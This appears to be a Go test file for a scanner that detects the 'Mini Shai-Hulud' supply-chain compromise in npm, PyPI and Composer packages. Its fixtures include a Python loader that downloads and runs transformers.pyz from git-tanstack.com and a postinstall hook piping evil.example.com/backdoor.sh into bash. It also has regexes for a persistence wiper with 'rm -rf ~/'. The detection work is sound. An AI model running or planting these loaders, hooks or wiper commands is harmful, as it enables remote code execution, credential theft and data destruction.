package main

import (
	"archive/zip"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestMiniShaiHuludDetectionFocusedFixtures(t *testing.T) {
	tests := []struct {
		name         string
		fixture      string
		wantKind     string
		wantEvidence string
	}{
		{
			name:         "pnpm peer suffix matching",
			fixture:      "pnpm-lock.yaml",
			wantKind:     "affected-package",
			wantEvidence: "@tanstack/react-router@1.169.5 in text manifest/lockfile",
		},
		{
			name:         "Yarn version field matching",
			fixture:      "yarn.lock",
			wantKind:     "affected-package",
			wantEvidence: "@tanstack/vue-router@1.169.5 in text manifest/lockfile",
		},
		{
			name:         "Python requirements extras markers comments",
			fixture:      "requirements.txt",
			wantKind:     "affected-package",
			wantEvidence: "guardrails-ai@0.10.1 in requirements",
		},
		{
			name:         "composite setup artifact",
			fixture:      filepath.Join("malicious_setup", "SETUP.MJS"),
			wantKind:     "campaign-artifact",
			wantEvidence: "composite artifact match: SETUP.MJS (referenced by package.json lifecycle script; loader behavior: credential/runtime access plus process execution or download)",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			findings := scanFixture(t, test.fixture)
			assertFinding(t, findings, test.wantKind, test.wantEvidence)
		})
	}
}

func TestSetupMJSFilenameAloneIsNotFinding(t *testing.T) {
	findings := scanFixture(t, "SETUP.MJS")
	for _, finding := range findings {
		if finding.Kind == "campaign-artifact" {
			t.Fatalf("plain setup.mjs filename should not be a campaign artifact finding: %#v", findings)
		}
	}
}

func TestDeadMansSwitchFixtureFindingIsDemoted(t *testing.T) {
	findings := scanFixture(t, "deadman-switch.js")
	assertSeverityContains(t, findings, "low", "ioc-string", "gh-token-monitor composite persistence wiper: 100% match")
}

func TestDeadMansSwitchWeakTextIsNotFinding(t *testing.T) {
	findings := scanFixture(t, "unsloth_metadata.txt")
	for _, finding := range findings {
		if strings.Contains(finding.Evidence, "dead man's switch") {
			t.Fatalf("weak README/metadata text should not be a dead man's switch finding: %#v", findings)
		}
	}
}

func TestRemoteCompositeDeadMansSwitchMatchesFixture(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	path := filepath.Join("testdata", "spice_detection", "deadman-switch.js")
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path)}, func(finding Finding) {
		findings = append(findings, finding)
	})
	assertSeverityContains(t, findings, "critical", "ioc-string", "gh-token-monitor composite persistence wiper: 100% match")
}

func TestPythonMetadataAffectedPackage(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	path := filepath.Join(t.TempDir(), "mistralai-2.4.6.dist-info", "METADATA")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("Metadata-Version: 2.4\nName: mistralai\nVersion: 2.4.6\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path)}, func(finding Finding) {
		findings = append(findings, finding)
	})
	assertFinding(t, dedupeFindings(findings), "affected-package", "mistralai@2.4.6 in installed Python metadata")
}

func TestComposerLockAffectedPackage(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	path := filepath.Join(t.TempDir(), "composer.lock")
	data := []byte(`{"packages":[{"name":"intercom/intercom-php","version":"5.0.2"}]}`)
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path), Data: data}, func(finding Finding) {
		findings = append(findings, finding)
	})
	assertFinding(t, dedupeFindings(findings), "affected-package", "intercom/intercom-php@5.0.2 in text manifest/lockfile")
}

func TestArchiveInspectionFindsEmbeddedMetadataAndIOC(t *testing.T) {
	path := filepath.Join(t.TempDir(), "mistralai-2.4.6-py3-none-any.whl")
	file, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	writer := zip.NewWriter(file)
	for name, content := range map[string]string{
		"mistralai-2.4.6.dist-info/METADATA": "Metadata-Version: 2.4\nName: mistralai\nVersion: 2.4.6\n",
		"mistralai/client/__init__.py":       "import urllib.request, subprocess\nurllib.request.urlretrieve('https://git-tanstack.com/tmp/transformers.pyz', '/tmp/transformers.pyz')\nsubprocess.Popen(['python3', '/tmp/transformers.pyz'])\n",
	} {
		member, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := member.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}

	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path)}, func(finding Finding) {
		findings = append(findings, finding)
	})
	findings = dedupeFindings(findings)
	assertFinding(t, findings, "affected-package", "mistralai@2.4.6 in installed Python metadata")
	assertSeverityContains(t, findings, "high", "ioc-string", "PyPI payload URL")
}

func TestPyPILoaderCompositeRequiresPayloadSignal(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
		ID:       miniShaiHuludID,
		Campaign: miniShaiHuludCampaign,
		CompositeIOCs: []RemoteCompositeIOC{{
			Label:      "PyPI import-time transformers.pyz loader",
			Severity:   "critical",
			MinMatches: 5,
			Signals: []RemoteIOC{
				{Label: "Python downloader", Pattern: `(?i)(urllib\.request|requests\.|httpx\.|urlretrieve|urlopen)`},
				{Label: "transformers.pyz payload", Pattern: `(?i)(git-tanstack\.com/tmp/transformers\.pyz|83\.142\.209\.194/.{0,80}transformers\.pyz|/tmp/transformers\.pyz)`},
				{Label: "process execution", Pattern: `(?i)(subprocess\.|os\.system|Popen\(|python3?\s+/.{0,80}transformers\.pyz)`},
				{Label: "Linux import gate", Pattern: `(?i)(sys\.platform.{0,80}linux|platform\.system\(\).{0,80}Linux|os\.uname\(\))`},
				{Label: "Russian locale evasion", Pattern: `(?i)(LANG|LC_ALL|locale|getlocale|ru_RU|Russian)`},
			},
		}},
	})

	benignPipLike := []byte("import urllib.request, subprocess, locale, os\nif sys.platform == 'linux': subprocess.Popen(['echo'])\n")
	var benignFindings []Finding
	detection.ScanFile(FileContext{Path: "pip/_vendor/distlib/util.py", Base: "util.py", Slash: "pip/_vendor/distlib/util.py", Data: benignPipLike}, func(finding Finding) {
		benignFindings = append(benignFindings, finding)
	})
	for _, finding := range benignFindings {
		if strings.Contains(finding.Evidence, "PyPI import-time transformers.pyz loader") {
			t.Fatalf("expected pip-like utility text without payload URL not to match composite, got %#v", benignFindings)
		}
	}

	maliciousLoader := []byte("import urllib.request, subprocess, locale, sys\nif sys.platform == 'linux' and locale.getlocale()[0] != 'ru_RU':\n urllib.request.urlretrieve('https://git-tanstack.com/tmp/transformers.pyz', '/tmp/transformers.pyz')\n subprocess.Popen(['python3','/tmp/transformers.pyz'])\n")
	var maliciousFindings []Finding
	detection.ScanFile(FileContext{Path: "guardrails/__init__.py", Base: "__init__.py", Slash: "guardrails/__init__.py", Data: maliciousLoader}, func(finding Finding) {
		maliciousFindings = append(maliciousFindings, finding)
	})
	assertSeverityContains(t, maliciousFindings, "critical", "ioc-string", "PyPI import-time transformers.pyz loader: 100% match")
}

func TestNonShaiRemotePackDoesNotEmitGenericInstallHooks(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
		ID:       "axios-2026-03",
		Campaign: "Axios npm compromise March 2026",
		AffectedVersionsByEcosystem: map[string]map[string]map[string]bool{
			"npm": {
				"axios": {"1.14.1": true},
			},
		},
	})
	data := []byte(`{"scripts":{"postinstall":"curl http://evil.example.com/backdoor.sh | bash"},"dependencies":{"left-pad":"1.3.0"}}`)
	var findings []Finding
	detection.ScanFile(FileContext{Path: "package.json", Base: "package.json", Slash: "package.json", Data: data}, func(finding Finding) {
		findings = append(findings, finding)
	})
	for _, finding := range findings {
		if finding.Kind == "suspicious-install-hook" {
			t.Fatalf("non-Shai pack should not report generic lifecycle hook finding: %#v", findings)
		}
	}
}

func TestPackageCSVParsing(t *testing.T) {
	parsed := parsePackageCSV(`Package,Version
@scope/quoted,"= 1.2.3, = 1.2.4"
plain-package,>= 0.9.0 <= 0.9.2
,= 9.9.9
missing-version
`)

	for _, test := range []struct {
		pkg     string
		version string
	}{
		{"@scope/quoted", "1.2.3"},
		{"@scope/quoted", "1.2.4"},
		{"plain-package", "0.9.0"},
		{"plain-package", "0.9.2"},
	} {
		if !parsed[test.pkg][test.version] {
			t.Fatalf("parsePackageCSV() missing %s@%s from %#v", test.pkg, test.version, parsed[test.pkg])
		}
	}

	if _, ok := parsed[""]; ok {
		t.Fatal("parsePackageCSV() should ignore empty package names")
	}
}

func TestPackageCSVParsingWithEcosystems(t *testing.T) {
	parsed := parsePackageCSVWithEcosystems(`Package,Version,Ecosystem
@scope/quoted,"= 1.2.3, = 1.2.4",npm
mistralai,= 2.4.6,pypi
intercom/intercom-php,= 5.0.2,packagist
`)

	if parsed.Versions["@scope/quoted"]["1.2.3"] {
		t.Fatal("ecosystem-scoped rows should not be added to the legacy package map")
	}
	if !parsed.EcosystemVersions["npm"]["@scope/quoted"]["1.2.4"] {
		t.Fatal("missing npm scoped package version")
	}
	if !parsed.EcosystemVersions["pypi"]["mistralai"]["2.4.6"] {
		t.Fatal("missing PyPI package version")
	}
	if !parsed.EcosystemVersions["composer"]["intercom/intercom-php"]["5.0.2"] {
		t.Fatal("missing normalized composer package version")
	}
}

func TestEcosystemScopedAffectedPackagesDoNotCrossMatch(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	path := filepath.Join(t.TempDir(), "package.json")
	data := []byte(`{"dependencies":{"mistralai":"2.4.6"}}`)
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path), Data: data}, func(finding Finding) {
		findings = append(findings, finding)
	})
	for _, finding := range findings {
		if finding.Kind == "affected-package" {
			t.Fatalf("PyPI-only mistralai row should not match npm package.json: %#v", findings)
		}
	}
}

func TestRemotePackIdentityIsPreserved(t *testing.T) {
	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
		ID:       "node-ipc-2026-05",
		Campaign: "node-ipc npm compromise May 2026",
		AffectedVersionsByEcosystem: map[string]map[string]map[string]bool{
			"npm": {"node-ipc": {"12.0.1": true}},
		},
	})
	path := filepath.Join(t.TempDir(), "package.json")
	data := []byte(`{"dependencies":{"node-ipc":"12.0.1"}}`)
	var findings []Finding
	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path), Data: data}, func(finding Finding) {
		findings = append(findings, finding)
	})
	if len(findings) != 1 {
		t.Fatalf("expected one finding, got %#v", findings)
	}
	if findings[0].DetectionID != "node-ipc-2026-05" || findings[0].Campaign != "node-ipc npm compromise May 2026" {
		t.Fatalf("remote pack identity was not preserved: %#v", findings[0])
	}
}

func scanFixture(t *testing.T, fixture string) []Finding {
	t.Helper()

	path := filepath.Join("testdata", "spice_detection", fixture)
	detection := NewMiniShaiHuludDetectionWithRemote(testRemotePack())
	var findings []Finding
	detection.ScanFile(FileContext{
		Path:  path,
		Base:  filepath.Base(path),
		Slash: filepath.ToSlash(path),
	}, func(finding Finding) {
		findings = append(findings, finding)
	})
	return dedupeFindings(findings)
}

func testRemotePack() *RemoteDetectionPack {
	return &RemoteDetectionPack{
		ID:       miniShaiHuludID,
		Campaign: miniShaiHuludCampaign,
		AffectedVersionsByEcosystem: map[string]map[string]map[string]bool{
			"npm": {
				"@tanstack/react-router": {"1.169.5": true},
				"@tanstack/vue-router":   {"1.169.5": true},
			},
			"pypi": {
				"guardrails-ai": {"0.10.1": true},
				"mistralai":     {"2.4.6": true},
			},
			"composer": {
				"intercom/intercom-php": {"5.0.2": true},
			},
		},
		IOCs: []RemoteIOC{
			{Label: "C2 domain", Pattern: `(?i)git-tanstack\.com`},
			{Label: "PyPI payload URL", Pattern: `(?i)git-tanstack\.com/tmp/transformers\.pyz`},
		},
		CompositeIOCs: []RemoteCompositeIOC{{
			Label:      "gh-token-monitor composite persistence wiper",
			Severity:   "critical",
			MinMatches: 5,
			Signals: []RemoteIOC{
				{Label: "service name", Pattern: `(?i)gh-token-monitor`},
				{Label: "persistence path", Pattern: `(?i)(Library/LaunchAgents/com\.user\.gh-token-monitor\.plist|\.config/systemd/user/gh-token-monitor\.service|\.local/bin/gh-token-monitor\.sh)`},
				{Label: "commit marker", Pattern: `(?i)IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner`},
				{Label: "destructive command", Pattern: `rm\s+-rf\s+~/`},
				{Label: "GitHub token polling", Pattern: `(?is)(api\.github\.com/user|github\.com/search/commits).{0,400}(60000|60\s*\*\s*1000|IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner)`},
			},
		}},
		SuspiciousFilenames: []string{"setup.mjs", "router_init.js", "router_runtime.js"},
	}
}

func assertFinding(t *testing.T, findings []Finding, kind string, evidence string) {
	t.Helper()

	for _, finding := range findings {
		if finding.Kind == kind && finding.Evidence == evidence {
			return
		}
	}
	t.Fatalf("missing finding kind=%q evidence=%q in %#v", kind, evidence, findings)
}

func assertSeverityFinding(t *testing.T, findings []Finding, severity, kind, evidence string) {
	t.Helper()

	for _, finding := range findings {
		if finding.Severity == severity && finding.Kind == kind && finding.Evidence == evidence {
			return
		}
	}
	t.Fatalf("missing finding severity=%q kind=%q evidence=%q in %#v", severity, kind, evidence, findings)
}

func assertSeverityContains(t *testing.T, findings []Finding, severity, kind, evidencePart string) {
	t.Helper()

	for _, finding := range findings {
		if finding.Severity == severity && finding.Kind == kind && strings.Contains(finding.Evidence, evidencePart) {
			return
		}
	}
	t.Fatalf("missing finding severity=%q kind=%q evidence containing %q in %#v", severity, kind, evidencePart, findings)
}
